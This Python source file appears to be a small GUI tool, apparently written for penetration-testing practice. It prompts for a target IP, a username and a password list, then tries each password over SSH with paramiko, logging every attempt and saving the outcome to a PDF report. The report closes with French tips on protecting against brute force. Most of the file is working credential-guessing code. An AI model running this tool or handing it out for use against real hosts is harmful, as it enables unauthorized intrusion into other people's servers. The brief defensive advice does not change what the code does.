import tkinter as tk
from tkinter import messagebox, simpledialog, scrolledtext, filedialog
import paramiko
import time
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

def create_pdf_report(attack_name, content):
    file_name = f"{attack_name}_{time.strftime('%Y-%m-%d_%H-%M-%S')}.pdf"
    file_path = filedialog.asksaveasfilename(defaultextension=".pdf", initialfile=file_name, filetypes=[("PDF files", "*.pdf")])
    if file_path:
        c = canvas.Canvas(file_path, pagesize=letter)
        c.drawString(100, 750, attack_name)
        c.drawString(100, 730, time.strftime('%Y-%m-%d %H:%M:%S'))
        c.drawString(100, 710, "Report:")
        
        text = content.split('\n')
        y = 690
        for line in text:
            c.drawString(100, y, line)
            y -= 20
            if y < 50:
                c.showPage()
                y = 750
        
        c.drawString(100, y-20, "Conseils pour se protéger contre les attaques par force brute SSH:")
        y -= 40
        conseils = [
            "1. Utiliser des mots de passe forts et complexes.",
            "2. Configurer l'authentification à deux facteurs (2FA).",
            "3. Limiter les tentatives de connexion avec des outils comme fail2ban.",
            "4. Désactiver l'accès root via SSH.",
            "5. Utiliser des clés SSH au lieu de mots de passe."
        ]
        for conseil in conseils:
            c.drawString(100, y, conseil)
            y -= 20
            if y < 50:
                c.showPage()
                y = 750
        
        c.save()
        messagebox.showinfo("Report Created", f"The report has been saved as {file_path}")

def ssh_brute_force(target, username, password_list, log_widget):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            ssh.connect(target, username=username, password=password)
            log_widget.insert(tk.END, f'Success: {username}:{password}\n')
            log_widget.see(tk.END)
            return f'Success: {username}:{password}'
        except paramiko.AuthenticationException:
            log_widget.insert(tk.END, f'Failed: {username}:{password}\n')
            log_widget.see(tk.END)
            continue
    return 'Failed: No valid credentials found'

def run_brute_force(log_widget):
    log_widget.delete('1.0', tk.END)
    target = simpledialog.askstring("SSH Brute Force", "Enter the target IP address:")
    username = simpledialog.askstring("SSH Brute Force", "Enter the username:")
    passwords = simpledialog.askstring("SSH Brute Force", "Enter the passwords (comma-separated):")
    if target and username and passwords:
        password_list = passwords.split(',')
        result = ssh_brute_force(target, username, password_list, log_widget)
        create_pdf_report("SSH_Brute_Force", result)
